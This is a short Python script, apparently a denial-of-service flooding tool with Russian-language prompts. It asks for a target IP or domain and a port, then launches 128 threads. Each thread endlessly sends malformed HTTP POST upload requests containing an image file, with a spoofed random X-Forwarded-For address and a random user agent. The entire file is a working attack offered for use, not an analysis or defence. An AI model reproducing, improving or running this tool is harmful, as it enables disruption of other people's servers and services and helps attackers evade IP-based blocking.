import os
import socket
import random
from banner import banner
from agent import user_agent
from threading import Thread


def clear():
    if os.name == 'nt':
        os.system("cls")
    else:
        os.system('clear')
    print(banner)


def ip_generate():
    mask = '***.***.***.***'
    ip = str()
    for symbol in mask:
        if symbol == '*':
            ip += random.choice(list('1234567890'))
        else:
            ip += symbol
    return ip


def get_headers():
    output = 'POST /upload HTTP/1.1\r\n'
    output += "Connection: keep-alive\r\n"
    output += "Referer: null\r\n"
    output += f"X-Forwarded-For: {ip_generate()}\r\n"
    output += f"HEAD {'https://' + ip} HTTP/1.1\r\nHost: {ip}\r\n"
    output += "Accept-Encoding: gzip, deflate, br\r\n"
    output += f'User-Agent: {user_agent()}\r\n\r\n\r\n'
    output += f'Content-Length: {len(photo) + len("ricardo.png")}\r\n\r\n'
    output += f'file_name=ricardo.png&'
    output += f'photo_data={photo}'
    return str(output).encode()


def thread():
    con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    con.connect((ip, port))
    while True:
        try:
            con.send(get_headers())
            print('Request was sent')
        except Exception as e:
            print(e)


def start_attack():
    for i in range(128):
        Thread(target=thread, daemon=False).start()

clear()
def main():
    global photo
    global ip
    global port
    global con

    photo = open('ricardo.png', encoding="utf-8", errors='ignore').read()
    ip = input('Введите ip/Домен: ')
    port = int(input('Введите порт: '))
    print("[?] Запуск атаки...")
    start_attack()
main()
